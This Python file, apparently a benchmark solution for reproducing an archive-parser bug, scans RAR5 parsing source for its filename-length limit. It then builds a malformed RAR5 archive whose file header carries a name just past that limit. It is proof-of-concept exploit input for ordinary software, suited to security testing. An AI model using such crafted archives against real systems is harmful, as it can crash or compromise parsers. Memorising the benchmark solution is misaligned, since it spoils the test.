import os
import re
import tarfile
import zlib
import struct
import ast
from typing import Dict, Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        max_name = self._find_rar5_name_limit(src_path)
        if max_name is None:
            max_name = 1024
        if max_name < 64 or max_name > (1 << 20):
            max_name = 1024
        name_len = max(max_name + 1, 129)

        sig = b"Rar!\x1a\x07\x01\x00"

        main_body = self._vint(0)  # archive flags
        main_blk = self._rar5_block(header_type=1, header_flags=0, body=main_body, data=b"")

        file_flags = 0
        unp_size = 0
        attributes = 0x20
        comp_info = 0
        host_os = 0
        file_body = (
            self._vint(file_flags)
            + self._vint(unp_size)
            + self._vint(attributes)
            + self._vint(comp_info)
            + self._vint(host_os)
            + self._vint(name_len)
            + (b"A" * name_len)
        )
        file_blk = self._rar5_block(header_type=2, header_flags=2, body=file_body, data=b"")

        end_body = self._vint(0)
        end_blk = self._rar5_block(header_type=5, header_flags=0, body=end_body, data=b"")

        return sig + main_blk + file_blk + end_blk

    @staticmethod
    def _vint(n: int) -> bytes:
        if n < 0:
            raise ValueError("vint only supports non-negative integers")
        out = bytearray()
        while n >= 0x80:
            out.append((n & 0x7F) | 0x80)
            n >>= 7
        out.append(n & 0x7F)
        return bytes(out)

    def _rar5_block(self, header_type: int, header_flags: int, body: bytes, data: bytes) -> bytes:
        if data is None:
            data = b""
        prefix = self._vint(header_type) + self._vint(header_flags)
        if header_flags & 0x01:
            prefix += self._vint(0)  # extra size (none)
        if header_flags & 0x02:
            prefix += self._vint(len(data))
        header_wo_size = prefix + body

        size = len(header_wo_size) + 1
        for _ in range(20):
            size_bytes = self._vint(size)
            new_size = len(header_wo_size) + len(size_bytes)
            if new_size == size:
                break
            size = new_size
        header_bytes = self._vint(size) + header_wo_size
        if len(header_bytes) != size:
            size = len(header_bytes)
            header_bytes = self._vint(size) + header_wo_size

        crc = zlib.crc32(header_bytes) & 0xFFFFFFFF
        return struct.pack("<I", crc) + header_bytes + data

    def _find_rar5_name_limit(self, src_path: str) -> Optional[int]:
        texts = self._collect_rar5_texts(src_path)
        if not texts:
            return None

        macros: Dict[str, str] = {}
        for _, text in texts:
            self._extract_macros(text, macros)

        candidates: List[int] = []
        for _, text in texts:
            candidates.extend(self._extract_name_limit_candidates(text, macros))

        if candidates:
            candidates = [c for c in candidates if 0 < c < (1 << 30)]
            if candidates:
                best = min(candidates)
                return best
        return None

    def _collect_rar5_texts(self, src_path: str) -> List[Tuple[str, str]]:
        results: List[Tuple[str, str]] = []

        def add_text(path: str, raw: bytes):
            try:
                txt = raw.decode("utf-8", errors="ignore")
            except Exception:
                return
            if "rar5" not in path.lower() and "rar" not in path.lower():
                if "rar5" not in txt.lower():
                    return
            results.append((path, txt))

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not (lfn.endswith(".c") or lfn.endswith(".h") or lfn.endswith(".cc") or lfn.endswith(".cpp")):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        with open(path, "rb") as f:
                            raw = f.read()
                    except Exception:
                        continue
                    add_text(path, raw)
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name
                        lname = name.lower()
                        if not (lname.endswith(".c") or lname.endswith(".h") or lname.endswith(".cc") or lname.endswith(".cpp")):
                            continue
                        if "rar5" not in lname and "rar" not in lname:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            raw = f.read()
                        except Exception:
                            continue
                        add_text(name, raw)
            except Exception:
                return []

        results.sort(key=lambda x: (0 if "support_format_rar5" in x[0].lower() else 1, len(x[1])))
        return results[:30] if results else []

    @staticmethod
    def _strip_c_comments(text: str) -> str:
        text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
        text = re.sub(r"//.*?$", "", text, flags=re.M)
        return text

    def _extract_macros(self, text: str, macros: Dict[str, str]) -> None:
        t = self._strip_c_comments(text)
        for line in t.splitlines():
            line = line.strip()
            if not line.startswith("#"):
                continue
            m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$", line)
            if not m:
                continue
            name = m.group(1)
            rhs = m.group(2).strip()
            if "(" in name:
                continue
            if rhs.startswith("(") and rhs.endswith(")"):
                rhs = rhs[1:-1].strip()
            if not rhs:
                continue
            if re.match(r"^[A-Za-z_]\w*\s*\(", rhs):
                continue
            macros.setdefault(name, rhs)

    def _extract_name_limit_candidates(self, text: str, macros: Dict[str, str]) -> List[int]:
        t = self._strip_c_comments(text)
        out: List[int] = []

        cmp_patterns = [
            r"\b(name|filename|file_name)\w*\s*(_?size|_?length|_?len)\b[^;\n]*?(?:>|>=)\s*([A-Za-z0-9_()xX+\-*/<>&|^~\s]+)",
            r"\b([A-Za-z_]\w*)\b\s*(?:>|>=)\s*\b(name|filename|file_name)\w*\s*(_?size|_?length|_?len)\b",
        ]

        for pat in cmp_patterns:
            for m in re.finditer(pat, t, flags=re.I):
                expr = None
                if len(m.groups()) >= 3 and m.group(3) is not None:
                    expr = m.group(3)
                elif len(m.groups()) >= 1 and m.group(1) is not None:
                    expr = m.group(1)
                if not expr:
                    continue
                expr = expr.strip()
                expr = re.split(r"[);,\n]", expr, maxsplit=1)[0].strip()
                expr = re.split(r"\b(?:&&|\|\|)\b", expr, maxsplit=1)[0].strip()
                val = self._eval_c_int_expr(expr, macros)
                if val is not None and 0 < val < (1 << 20):
                    out.append(val)

        for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_]\w*NAME\w*(?:MAX|LIMIT)\w*)\s+(.+)$", t, flags=re.M):
            expr = m.group(2).strip()
            expr = re.split(r"//|/\*", expr, maxsplit=1)[0].strip()
            val = self._eval_c_int_expr(expr, macros)
            if val is not None and 0 < val < (1 << 20):
                out.append(val)

        for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_]\w*(?:MAX|LIMIT)\w*NAME\w*)\s+(.+)$", t, flags=re.M):
            expr = m.group(2).strip()
            expr = re.split(r"//|/\*", expr, maxsplit=1)[0].strip()
            val = self._eval_c_int_expr(expr, macros)
            if val is not None and 0 < val < (1 << 20):
                out.append(val)

        return out

    def _eval_c_int_expr(self, expr: str, macros: Dict[str, str]) -> Optional[int]:
        if expr is None:
            return None
        expr = expr.strip()
        if not expr:
            return None

        expr = re.sub(r"\(\s*(?:size_t|uint64_t|uint32_t|uint16_t|uint8_t|int|unsigned|long|short)\s*\)", "", expr)
        expr = re.sub(r"(?i)\b([0-9]+)(?:u|ul|ull|l|ll)\b", r"\1", expr)
        expr = re.sub(r"(?i)\b(0x[0-9a-f]+)(?:u|ul|ull|l|ll)\b", r"\1", expr)
        expr = re.sub(r"\s+", " ", expr).strip()
        if len(expr) > 200:
            return None

        def resolve_name(name: str, depth: int = 0) -> Optional[int]:
            if depth > 10:
                return None
            rhs = macros.get(name)
            if rhs is None:
                return None
            rhs = rhs.strip()
            rhs = re.split(r"[);,\n]", rhs, maxsplit=1)[0].strip()
            return self._eval_c_int_expr_with_resolver(rhs, lambda n: resolve_name(n, depth + 1))

        return self._eval_c_int_expr_with_resolver(expr, resolve_name)

    @staticmethod
    def _eval_c_int_expr_with_resolver(expr: str, resolve_name) -> Optional[int]:
        allowed_chars = set("0123456789abcdefABCDEFxX+-*/()%<>&|^~ \t\n\r")
        for ch in expr:
            if ch.isalpha() or ch == "_":
                continue
            if ch not in allowed_chars:
                return None

        try:
            node = ast.parse(expr, mode="eval")
        except Exception:
            return None

        def eval_node(n) -> Optional[int]:
            if isinstance(n, ast.Expression):
                return eval_node(n.body)
            if isinstance(n, ast.Constant):
                if isinstance(n.value, bool):
                    return int(n.value)
                if isinstance(n.value, (int,)):
                    return int(n.value)
                return None
            if isinstance(n, ast.Num):
                return int(n.n)
            if isinstance(n, ast.UnaryOp):
                v = eval_node(n.operand)
                if v is None:
                    return None
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                if isinstance(n.op, ast.Invert):
                    return ~v
                return None
            if isinstance(n, ast.BinOp):
                a = eval_node(n.left)
                b = eval_node(n.right)
                if a is None or b is None:
                    return None
                op = n.op
                if isinstance(op, ast.Add):
                    return a + b
                if isinstance(op, ast.Sub):
                    return a - b
                if isinstance(op, ast.Mult):
                    return a * b
                if isinstance(op, ast.Div):
                    if b == 0:
                        return None
                    return int(a / b)
                if isinstance(op, ast.FloorDiv):
                    if b == 0:
                        return None
                    return a // b
                if isinstance(op, ast.Mod):
                    if b == 0:
                        return None
                    return a % b
                if isinstance(op, ast.LShift):
                    if b < 0 or b > 63:
                        return None
                    return a << b
                if isinstance(op, ast.RShift):
                    if b < 0 or b > 63:
                        return None
                    return a >> b
                if isinstance(op, ast.BitOr):
                    return a | b
                if isinstance(op, ast.BitAnd):
                    return a & b
                if isinstance(op, ast.BitXor):
                    return a ^ b
                return None
            if isinstance(n, ast.Name):
                val = resolve_name(n.id)
                if val is None:
                    return None
                return int(val)
            if isinstance(n, ast.ParenExpr):  # Python 3.12+
                return eval_node(n.expression)
            return None

        try:
            v = eval_node(node)
        except Exception:
            return None
        if v is None:
            return None
        if not isinstance(v, int):
            return None
        return v